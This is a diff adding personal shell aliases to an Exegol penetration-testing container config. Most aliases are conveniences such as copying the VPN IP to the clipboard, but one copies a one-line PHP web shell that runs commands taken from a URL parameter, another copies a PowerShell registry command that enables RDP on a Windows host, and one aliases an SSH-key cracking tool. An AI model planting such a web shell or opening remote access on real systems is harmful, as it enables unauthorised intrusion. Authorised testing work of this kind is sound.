@@ -1,2 +1,10 @@
 # Config file dedicated to the user's personal aliases shared between all exegol containers
-
+alias path="echo $PATH | sed 's/:/\n/g'"
+alias ports="ss -tulanp"
+alias files="nautilus"
+alias vpn='if [ ! -z "$(ip a | grep -A 1 tun0)" ]; then ip a | grep -A 1 tun0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1 | tr -d "\n" | xclip -selection clipboard -rmlastnl | echo "\033[0;32mVPN IP COPIED !\033[0m";fi'
+alias lan='ip a | grep "inet " | sed -n 2p | sed "s/^ *//" | sed "s/ *$//" | cut -d " " -f 2 | cut -d "/" -f 1 | tr -d "\n" | xclip -selection clipboard -rmlastnl | echo "\033[0;32mLAN IP COPIED !\033[0m"'
+alias getwinfr='echo -n "Set-WinSystemLocale fr-FR; Set-WinUserLanguageList -LanguageList fr-FR -Force; Set-WinUILanguageOverride fr-FR;" | xclip -selection clipboard -rmlastnl && echo "Commande dans le presse-papiers"'
+alias getwinrdp='echo "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" -Value 0" | xclip -selection clipboard -rmlastnl && echo "CMD copié dans le presse-papiers"'
+alias ssh2john='ssh2john.py'
+alias phprevshell='echo "<?php system(\$_GET[\"cmd\"]); ?>" | xclip -selection clipboard -rmlastnl && echo "[+] php rev shell copied to clipboard"'
